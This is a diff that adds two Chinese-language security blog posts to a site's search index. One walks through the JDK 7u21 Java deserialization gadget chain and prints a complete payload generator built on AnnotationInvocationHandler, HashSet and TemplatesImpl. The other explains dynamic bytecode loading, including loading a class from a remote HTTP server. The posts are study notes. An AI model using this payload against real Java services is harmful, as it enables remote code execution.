@@ -4672,4 +4672,113 @@
         <tag>shiro</tag>
       </tags>
   </entry>
+  <entry>
+    <title>7u21</title>
+    <url>/2022/03/24/7u21/</url>
+    <content><![CDATA[<p>首先去下载个jdk7u21</p>
+<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p>
+<p>然后去下载对应版本的openjdk</p>
+<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
+<p>注:以下所有提到<code>templates</code>对象的地方,<code>templates</code>都指的是实例化<code>TemplatesImpl</code>并构造好的恶意类</p>
+<h4 id="类分析"><a href="#类分析" class="headerlink" title="类分析"></a>类分析</h4><p><code>AnnotationInvocationHandler</code>这个类中有一个<code>equalsImpl</code>方法</p>
+<p>它可以调用通过反射调用所有通过<code>getMemberMethods</code>获取到的Method数组中的method</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220324112303655.png" alt="image-20220324112303655"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            String member = memberMethod.getName();</span><br><span class="line">            Object ourValue = memberValues.get(member);</span><br><span class="line">            Object hisValue = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    hisValue = memberMethod.invoke(o);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说， <code>equalsImpl</code> 这个方法是将 <code>this.type</code> 类中的所有方法遍历并执行了。那么，假设<code>this.type</code>是<code>TemplatesImpl</code>类，则势必会调用到其中的 <code>newTransformer() </code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行。</p>
+<h4 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h4><p>接下来找调用了<code>equalsImpl</code>方法的地方,因为其是private,所以一般都在本类中调用</p>
+<p>在本类中的invoke方法中找到了<code>equalsImpl</code>的调用</p>
+<p>这里就又涉及到了动态代理的问题</p>
+<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口,所以它只需要代理对应的类,然后调用类中的任意方法都会执行invoke方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        String member = method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当调用的方法名为<code>equals</code>的时候,会调用<code>equalsImpl</code>方法</p>
+<p>找<code>equals</code>方法调用链</p>
+<p>比较Java对象的时候,常用的两个方法</p>
+<ul>
+<li>equals</li>
+<li>compareTo</li>
+</ul>
+<p>任意java兑现都有<code>equals</code>方法,它通常用于比较两个对象是否是同一个引用,<code>而compareTo</code>实际上是<code>java.lang.Compareable</code>接口的方法,<code>java.util.PriorityQueue</code>中也用到过,通常被实现用于比较两个对象的值是否相等.</p>
+<p>一个常见的会调用equals的场景是集合Set,Set中存储的对象不允许重复,所以在添加对象的时候,势必会涉及到比较操作.</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220324175504230.png" alt="image-20220324175504230"></p>
+<p>可以把i暂且看为hashCode的单射函数,i就是对象在hash表中应该跟在哪个位置后面,当两个对象跟在同一个后面的时候,就会调用equals再次进行比较,接下来就是要让proxy对象的”i”等于templates的”i”</p>
+<p>跟着P牛的逻辑</p>
+<p>计算“哈希”的主要是下面这两行代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line"><span class="keyword">int</span> i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure>
+
+<p>将其中的关键逻辑提权出来，可以得到下面这个函数：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	h ^= key.hashCode();</span><br><span class="line">	h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">	h = h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> h &amp; <span class="number">15</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了<code>key.hashCode</code>外没有其他变量,所以proxy对象与<code>TemplateImpl</code>对象的”i”是否相等,仅仅取决于这两个对象的<code>hashCode</code>是否相等,TemplateImpl的<code>hashCode</code>是一个Native方法,每次运行都会发生变化,理论上是无法预测的,所以想让proxy的<code>hashCode</code>与之相等,只能寄希望于<code>proxy.hashCode</code></p>
+<p><code>proxy.hashCode()</code> 仍然会调用到<code> AnnotationInvocationHandler#invoke</code> ，进而调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code> ，这个方法代码如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码在看过p牛的解析后恍然大悟,果然是基础不牢,地动山摇,</p>
+<p>最核心的一点就是很基础的<code>0异或任何数都等于该数本身</code></p>
+<p>所以这个地方只需要保证<code>e.getKey().hashCode()</code>为0,那么就可以控制result为<code>memberValueHashCode(e.getValue())</code></p>
+<p><code>f5a5a608</code>字符串的HashCode为0,那么就可以作为map的key放进去,从而让<code>hashCodeImpl()</code>返回的值为<code>templates</code>的hashCode,这样在后面就会触发equals方法,</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\unser\\7u21\\target\\test-classes\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Class&lt;Templates&gt; templatesClass1 = Templates.class;</span><br><span class="line">        <span class="comment">//为templates创建代理实例proxy,调用proxy的任意方法都会调用到AnnotationInvocationHandler里面的invoke方法</span></span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Templates.class, map);</span><br><span class="line">        Object proxy= Proxy.newProxyInstance(test.class.getClassLoader(), templatesClass.getInterfaces(), handler);</span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line">        map.put(zeroHashCodeStr,templates);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(path));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h3><p>HashSet.readObject()—–&gt;新建一个hash链表,接着开始计算hash, proxy由于代理了<code>AnnotationInvocationHandler</code>所以调用<code>hashCode</code>会在<code>invoke</code>中走到<code>hashCodeImpl</code>方法然后这个地方的<code>memberValues</code>是之前的精心构造的map,它的key的hash结果是0,所以会返回<code>Templates</code>的hash结果,</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是proxy返回的hashCode和<code>Templates</code>的结果一样了,由于HashSet的特性,会调用<code>equals</code>方法,而proxy中调用<code>equals</code>方法会传入参数为<code>templates</code>作为调用到<code>equalsImpl</code>方法时<code>o</code>的值</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220325131726788.png" alt="image-20220325131726788"></p>
+<p>该方法遍历并执行type中的所有方法,而type是<code>TemplatesImpl</code>的接口,它其中只包括了危险的<code>newTransformer</code>和<code>getOutputProperties</code>,而此时<code>o</code>是实例化好的templates,触发恶意代码执行,这块是CC2的知识</p>
+<p>P牛的文章讲的真不错,静下心来看完收获不小呢</p>
+<h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p>画一个思维导图再加深一下理解</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220325134238553.png" alt="image-20220325134238553"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>java动态加载字节码</title>
+    <url>/2022/03/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
+    <content><![CDATA[<h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
+<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。</p>
+<p> 甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行：</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220323213706173.png" alt="image-20220323213706173"></p>
+<p>通常所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加 载的字节序列</p>
+<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><p><code>URLClassLoader </code>实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p>
+<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况： </p>
+<ul>
+<li><p>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </p>
+</li>
+<li><p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </p>
+</li>
+<li><p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 </p>
+</li>
+</ul>
+<p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。</p>
+<p>使用python搭建一个简易Http服务器,将class文件放在服务器上面,尝试加载</p>
+<p><code>python3 -m http.server 5555</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://xxxxxxxxxxx:5555/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
+<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>其实,不管是远程加载class文件还是本地的class或者Jar文件,经历的欧式下面这三个方法的调用</p>
+<p><code>loadClass</code>—&gt;<code>findClass</code>—&gt;<code>defineClass</code></p>
+<ul>
+<li><p>其中： loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 </p>
+</li>
+<li><p>findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </p>
+</li>
+<li><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p>
+</li>
+</ul>
+<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个native方法，逻辑在JVM的C语言代码中。\</p>
+<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。</p>
+<p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
+<h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p>
+<p>我们可以通过BCEL提供的两个类<code> Repository</code> 和<code>Utility</code>来利用： <code>Repository </code>用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：</p>
+<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的<code> TemplatesImpl</code> 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了.</p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
 </search>
